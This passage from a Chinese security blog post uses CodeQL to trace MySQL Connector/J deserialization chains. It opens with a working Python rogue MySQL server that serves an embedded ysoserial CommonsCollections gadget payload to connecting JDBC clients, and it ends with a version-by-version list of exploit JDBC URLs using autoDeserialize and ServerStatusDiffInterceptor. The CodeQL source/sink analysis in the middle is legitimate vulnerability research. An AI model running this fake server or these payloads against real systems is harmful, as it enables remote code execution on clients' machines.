class="built_in">format</span>(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">conn,data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload_content</span>():</span><br><span class="line">    <span class="comment">#file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] &gt; payload</span></span><br><span class="line">    file= <span class="string">r&#x27;payload&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(file):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            payload_content = <span class="built_in">str</span>(binascii.b2a_hex(f.read()),encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open successs&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open false&quot;</span>)</span><br><span class="line">        <span class="comment">#calc</span></span><br><span class="line">        payload_content=<span class="string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload_content</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要逻辑</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        conn, addr = sk.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1.先发送第一个 问候报文</span></span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span></span><br><span class="line">            receive_data(conn)</span><br><span class="line">            send_data(conn,response_ok_data)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#其他过程</span></span><br><span class="line">            data=receive_data(conn)</span><br><span class="line">            <span class="comment">#查询一些配置信息,其中会发送自己的 版本号</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload=<span class="string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn,_payload)</span><br><span class="line">                data=receive_data(conn)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, _payload)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set names&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set character_set_results&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show session status&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                mysql_data = <span class="string">&#x27;0100000102&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                <span class="comment"># 为什么我加了EOF Packet 就无法正常运行呢？？</span></span><br><span class="line">                <span class="comment"># 获取payload</span></span><br><span class="line">                payload_content=get_payload_content()</span><br><span class="line">                <span class="comment"># 计算payload长度</span></span><br><span class="line">                payload_length = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">4</span>)</span><br><span class="line">                payload_length_hex = payload_length[<span class="number">2</span>:<span class="number">4</span>] + payload_length[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                <span class="comment"># 计算数据包长度</span></span><br><span class="line">                data_len = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span> + <span class="number">4</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">6</span>)</span><br><span class="line">                data_len_hex = data_len[<span class="number">4</span>:<span class="number">6</span>] + data_len[<span class="number">2</span>:<span class="number">4</span>] + data_len[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                mysql_data += data_len_hex + <span class="string">&#x27;04&#x27;</span> + <span class="string">&#x27;fbfc&#x27;</span>+ payload_length_hex</span><br><span class="line">                mysql_data += <span class="built_in">str</span>(payload_content)</span><br><span class="line">                mysql_data += <span class="string">&#x27;07000005fe000022000100&#x27;</span></span><br><span class="line">                send_data(conn, mysql_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    HOST =<span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">    PORT = <span class="number">3307</span></span><br><span class="line"></span><br><span class="line">    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span></span><br><span class="line">    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sk.bind((HOST, PORT))</span><br><span class="line">    sk.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(HOST,PORT))</span><br><span class="line"></span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>
    </div>
</div></p>
<h1 id="选用方法"><a href="#选用方法" class="headerlink" title="选用方法"></a>选用方法</h1><p>首先是选用污点追踪，还是用<code>polyCalls</code>的方法，这里不用多说，肯定是用<code>polyCalls</code>这种函数调用的方法去找出链子，因为这里并不是说像分析springweb那样，追踪传入的get/post参数看他有没有sql注入之类的。</p>
<h1 id="找Sink"><a href="#找Sink" class="headerlink" title="找Sink"></a>找Sink</h1><p>sink就是<code>readObject</code>，找到哪些函数调用了<code>readObject</code>.</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">class ReadObjects1 extends <span class="keyword">Call</span> &#123;</span><br><span class="line">    ReadObjects()&#123;</span><br><span class="line">        this.getCallee().hasName(&quot;readObject&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" alt></p>
<blockquote>
<p>因为这里的<code>readObject</code>是被调用的，也没有任何的定义，所以继承<code>Call</code>，<code>getCallee</code>是函数本身。<br>如果是<code>this.getCaller().hasName(&quot;readObject&quot;)</code>那么就是readObject中调用了什么函数，结果如下<br><img src="/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt></p>
</blockquote>
<p>在这里可以找到3个readObject，但是调用他们的函数只有两个，分别是</p>
<ul>
<li>com.mysql.cj.jdbc.result.ResultSetImpl-&gt;getObject（一个参数）</li>
<li>com.mysql.cj.jdbc.util.ResultSetUtil-&gt;readObject(两个参数)</li>
</ul>
<p>那么codeql可以写出两个sink<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">class ReadObjects extends Callable &#123;</span><br><span class="line">    ReadObjects()&#123;</span><br><span class="line">        this.hasName(&quot;readObject&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;com.mysql.cj.jdbc.util&quot;, &quot;ResultSetUtil&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getNumberOfParameters() <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">class ReadObjects extends Callable &#123;</span><br><span class="line">    ReadObjects()&#123;</span><br><span class="line">        this.hasName(&quot;getObject&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;com.mysql.cj.jdbc.result&quot;, &quot;ResultSetImpl&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getNumberOfParameters() <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>注意这里是Callable，因为是找函数的定义，而不是调用</p>
<h1 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h1><p>一般来说Source就是比较难找的，sink无非就是那些危险函数。source就千变万化了。<br>在这里应该就是<code>getConnection</code>，但是<code>getConnection</code>在package<code>java.sql</code>中，并不在我们分析的库中，所以这里用</p>
<ul>
<li>com.mysql.cj.jdbc.NonRegisteringDriver-&gt;connect</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">GetConnection</span> <span class="keyword">extends</span> <span class="title class_">Callable</span> &#123;</span><br><span class="line">    GetConnection()&#123;</span><br><span class="line">        <span class="built_in">this</span>.hasName(<span class="string">&quot;connect&quot;</span>) and</span><br><span class="line">        <span class="built_in">this</span>.getDeclaringType().hasQualifiedName(<span class="string">&quot;com.mysql.cj.jdbc&quot;</span>,<span class="string">&quot;NonRegisteringDriver&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><p>按source分为两块讲</p>
<h2 id="readObject"><a href="#readObject" class="headerlink" title="readObject"></a>readObject</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ReadObjects extends Callable &#123;</span><br><span class="line">    ReadObjects()&#123;</span><br><span class="line">        this.hasName(&quot;readObject&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;com.mysql.cj.jdbc.util&quot;, &quot;ResultSetUtil&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getNumberOfParameters() <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class GetConnection extends Callable &#123;</span><br><span class="line">    GetConnection()&#123;</span><br><span class="line">        this.hasName(&quot;getInstance&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;com.mysql.cj.jdbc&quot;,&quot;ConnectionImpl&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">query predicate edges(Callable a, Callable b) &#123;</span><br><span class="line">    a.polyCalls(b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ReadObjects sink,GetConnection source</span><br><span class="line"><span class="keyword">where</span> edges<span class="operator">*</span>(source, sink)</span><br><span class="line"><span class="keyword">select</span> sink, source, sink, &quot;Sink is reached from $@.&quot;, sink, &quot;here&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" alt></p>
<p>第一个没有东西链子</p>
<h2 id="getObject"><a href="#getObject" class="headerlink" title="getObject"></a>getObject</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ReadObjects extends Callable &#123;</span><br><span class="line">    ReadObjects()&#123;</span><br><span class="line">        this.hasName(&quot;getObject&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;com.mysql.cj.jdbc.result&quot;, &quot;ResultSetImpl&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getNumberOfParameters() <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class GetConnection extends Callable &#123;</span><br><span class="line">    GetConnection()&#123;</span><br><span class="line">        this.hasName(&quot;connect&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;com.mysql.cj.jdbc&quot;,&quot;NonRegisteringDriver&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">query predicate edges(Callable a, Callable b) &#123;</span><br><span class="line">    a.polyCalls(b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Sink sink,GetConnection source</span><br><span class="line"><span class="keyword">where</span> edges<span class="operator">*</span>(source, sink)</span><br><span class="line"><span class="keyword">select</span> sink, source, sink, &quot;Sink is reached from $@.&quot;, sink, &quot;here&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" alt></p>
<p>有4条path，分别是</p>
<p><img src="/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" alt></p>
<p>但是他只会显示一条路径，所以要继续分析的话，就要继续更改source，改为<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">class GetConnection extends Callable &#123;</span><br><span class="line">    GetConnection()&#123;</span><br><span class="line">        this.hasName(&quot;getInstance&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;com.mysql.cj.jdbc&quot;,&quot;ConnectionImpl&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png" alt></p>
<h2 id="createProxyInstance"><a href="#createProxyInstance" class="headerlink" title="createProxyInstance"></a>createProxyInstance</h2><p><code>getInstance</code>这条链子就是网上大部分讲的东西，但是刚刚那层<code>connect</code>为source的结果还有几个proxy的函数就引起了我的注意，在这节就用<code>createProxyInstance</code>作为例子去分析。</p>
<p><img src="/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" alt></p>
<p>可以看到，在getInstance前面多了几个步骤，这里源码调试<br><img src="/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png" alt><br>可以看到有很多协议头，这里应该首先去官网或者google搜索该协议，而不是去调试代码<br>这里搜到了</p>
<p><a href="https://dev.mysql.com/doc/connector-j/8.1/en/connector-j-reference-dns-srv.html">https://dev.mysql.com/doc/connector-j/8.1/en/connector-j-reference-dns-srv.html</a></p>
<p><code>mysqlx+srv://johndoe:secret@_mysql._tcp.mycompany.local/db?xdevapi.dns-srv=true</code><br>通过该payload，可以通过dns srv记录去攻击</p>
<blockquote>
<p>DNS SRV就是记录 domain对应的ip，而且还能记录下port</p>
</blockquote>
<p>但是这里就不搭建dns服务器了，至此就分析完毕了</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这一节记录一下常用的payload</p>
<h2 id="detectCustomCollations链"><a href="#detectCustomCollations链" class="headerlink" title="detectCustomCollations链"></a>detectCustomCollations链</h2><h3 id="5-1-19-5-1-28"><a href="#5-1-19-5-1-28" class="headerlink" title="5.1.19-5.1.28"></a>5.1.19-5.1.28</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure>
<h3 id="5-1-29-5-1-40"><a href="#5-1-29-5-1-40" class="headerlink" title="5.1.29-5.1.40"></a>5.1.29-5.1.40</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure>
<h3 id="5-1-41-5-1-48"><a href="#5-1-41-5-1-48" class="headerlink" title="5.1.41-5.1.48"></a>5.1.41-5.1.48</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure>
<h3 id="6-0-2-6-0-6"><a href="#6-0-2-6-0-6" class="headerlink" title="6.0.2-6.0.6"></a>6.0.2-6.0.6</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure>
<h2 id="ServerStatusDiffInterceptor链"><a href="#ServerStatusDiffInterceptor链" class="headerlink" title="ServerStatusDiffInterceptor链"></a>ServerStatusDiffInterceptor链</h2><h3 id="5-1-0-5-1-10"><a href="#5-1-0-5-1-10" class="headerlink" title="5.1.0-5.1.10"></a>5.1.0-5.1.10</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select database()&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line"><span class="comment">//执行查询操作，返回的是数据库结果集的数据表</span></span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> ps.executeQuery();</span><br></pre></td></tr></table></figure>
<h3 id="5-1-11-5-x-xx"><a href="#5-1-11-5-x-xx" class="headerlink" title="5.1.11-5.x.xx"></a>5.1.11-5.x.xx</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure>
<h3 id="6-x"><a href="#6-x" class="headerlink" title="6.x"></a>6.x</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure>
